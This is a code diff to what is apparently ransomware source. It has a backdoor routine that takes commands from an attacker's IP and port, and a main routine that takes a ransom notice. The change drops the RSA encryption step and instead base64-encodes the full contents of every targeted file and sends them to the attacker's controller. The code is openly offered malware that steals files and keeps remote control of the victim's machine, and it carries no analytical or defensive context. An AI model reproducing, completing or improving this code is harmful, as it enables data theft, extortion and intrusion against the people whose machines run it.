@@ -370,7 +370,6 @@ def try_establish_backdoor(attacker_ip:"str", attacker_port:"int") -> "tuple[str
 			CONTROLLER.send(out)
 			if CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "STOP":
 				logger().info("STOP command received.")
-				EXIT_FLAG.set(True)
 				break
 		CONTROLLER.send(END_OF_COMMAND_SUFFIX)
 		assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
@@ -402,15 +401,6 @@ def _main(ransom_notice:"str", attacker_ip:"str", attacker_port:"int"):
 
 	assert isinstance(CONTROLLER, RSA_Crypto_ZLIB_Net_Controller)
 
-	logger().info("Making RSA instance...")
-	rsa = RSA()
-	# We are already in an encrypted connection, so send both the public and private keys.
-	pub1, pub2 = rsa.public_key
-	CONTROLLER.send(f"{pub1},{pub2}")
-	priv1, priv2 = rsa.private_key
-	CONTROLLER.send(f"{priv1},{priv2}")
-	logger().info(f"RSA instance created. public=[{pub1},{pub2}] private=[{priv1},{priv2}].")
-
 	logger().info("Encrypting files...")
 	CONTROLLER.send("BEGIN_FILE_LIST")
 	for file_name in files_to_encrypt:
@@ -419,13 +409,11 @@ def _main(ransom_notice:"str", attacker_ip:"str", attacker_port:"int"):
 	CONTROLLER.send("BEGIN_FILE_CONTENTS")
 	for file_name in files_to_encrypt:
 		with open(file_name, "rb") as f:
-			lines = f.readlines()
-		encrypted_lines = []
+			raw_lines = f.readlines()
+		raw = b"".join(raw_lines)
 		from base64 import b64encode
-		for chunk in lines:
-			encrypted_lines.append([x for x in rsa.encrypt(b64encode(chunk).decode())])
-		for encrypted_chunk in encrypted_lines:
-			CONTROLLER.send(",".join(str(x) for x in encrypted_chunk))
+		encoded = b64encode(raw).decode()
+		CONTROLLER.send(encoded)
 		CONTROLLER.send("END\x01FILE")
 	CONTROLLER.send("END_FILE_CONTENTS")
 
